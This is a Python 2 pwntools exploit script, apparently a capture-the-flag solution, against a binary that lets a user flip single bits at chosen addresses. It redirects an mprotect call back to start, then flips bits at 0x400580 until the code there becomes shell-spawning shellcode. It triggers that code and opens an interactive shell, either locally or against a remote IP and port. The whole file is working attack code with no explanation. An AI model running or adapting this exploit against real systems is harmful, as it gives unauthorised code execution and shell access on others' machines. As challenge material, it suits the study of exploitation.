#!/usr/bin/env python2

import sys
import argparse
from pwn import *

def exploit():
    context(arch = "amd64")

    # Overwrite call memprotect with call start
    payload = "400714:5"
    p.sendline(payload)

    # Craft shellcode
    shellcode_addr = 0x400580
    shellcode = asm(shellcraft.amd64.sh())
    curr = shellcode_addr

    # Original binary
    original = binary.read(shellcode_addr, len(shellcode))
        
    for i in xrange(len(shellcode)):
        for j in xrange(8):

            # Current bit
            curr_byte = shellcode[i]
            curr_bit = 1 if ((1 << j) & ord(curr_byte)) != 0 else 0 

            # Original bit
            original_byte = original[i]
            orig_bit = 1 if ((1 << j) & ord(original_byte)) != 0 else 0 

            # Flip bit 
            if orig_bit != curr_bit:
                p.sendline("{}:{}".format(hex(shellcode_addr + i)[2:], j))


    # Trigger shellcode
    payload = "400714:6"
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':

    # Argument parser
    parser = argparse.ArgumentParser(description='Exploit Dev Template')
    parser.add_argument('binary', help="Binary to exploit")
    parser.add_argument('-e', '--env', choices=['local', 'remote'],
                        help='Default : local',
                        default='local')

    parser.add_argument('-i', help="remote IP")
    parser.add_argument('-p', help="remote port")

    args = parser.parse_args()

    # Validate that an IP and port has been specified for remote env
    if args.env == "remote" and (args.i == None or args.p == None):
        print "%s : missing IP and/or port" % sys.argv[0]
        exit()

    # Load the binary
    try:
        binary = ELF(args.binary)
    except:
        log.warn("Issue opening %s" % args.binary)
        exit()

    try:
        libc = binary.libc
    except:
        log.warn("Libc not loaded.")

    env = args.env
    loot = {}

    if env == "local":
        p = process([args.binary])
        log.info(util.proc.pidof(p))

    elif env == "remote":
        p = remote(args.i, args.p)

    pause()
    exploit()
